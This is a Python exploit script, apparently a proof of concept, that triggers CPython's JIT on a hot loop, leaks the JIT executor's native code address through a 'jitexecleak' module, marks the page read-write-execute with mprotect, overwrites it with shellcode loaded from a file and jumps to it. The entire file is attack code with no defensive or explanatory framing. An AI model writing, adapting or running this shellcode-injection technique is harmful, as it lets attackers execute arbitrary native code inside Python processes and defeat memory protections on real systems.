import ctypes
import jitexecleak
import os

# -------------------------------------------------------
# Step 1: Define hot function to trigger JIT
# -------------------------------------------------------
def hot_loop(x):
    total = 0
    for i in range(100_000):
        if i % 17 == 0:
            total += x * i
        elif i % 7 == 0:
            total -= x // 2
        else:
            total ^= i
    return total

# -------------------------------------------------------
# Step 2: Warm-up the function to trigger JIT
# -------------------------------------------------------
print("[*] Warming up JIT...")
for _ in range(10000):
    hot_loop(42)

# -------------------------------------------------------
# Step 3: Leak JIT executor native address
# -------------------------------------------------------
addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] Leaked executor JIT code addr: 0x{addr:x}")

# -------------------------------------------------------
# Step 4: Load shellcode
# -------------------------------------------------------
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

print(f"[*] Loaded shellcode size: {len(shellcode)} bytes")

# -------------------------------------------------------
# Step 5: Make the memory region RWX via mprotect
# -------------------------------------------------------
PAGE_SIZE = 0x1000
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

libc = ctypes.CDLL("libc.so.6")
page_start = addr & ~(PAGE_SIZE - 1)
print(f"[*] Setting RWX on page 0x{page_start:x}")

result = libc.mprotect(ctypes.c_void_p(page_start), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC)
if result != 0:
    raise RuntimeError("[-] mprotect failed (check permissions or system security)")

# -------------------------------------------------------
# Step 6: Overwrite JIT code region with shellcode
# -------------------------------------------------------
print(f"[*] Overwriting executor->jit_code with shellcode...")
ctypes.memmove(ctypes.c_void_p(addr), shellcode, len(shellcode))

# -------------------------------------------------------
# Step 7: Execute the shellcode
# -------------------------------------------------------
print("[*] Jumping to shellcode...")
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(addr)
fn()

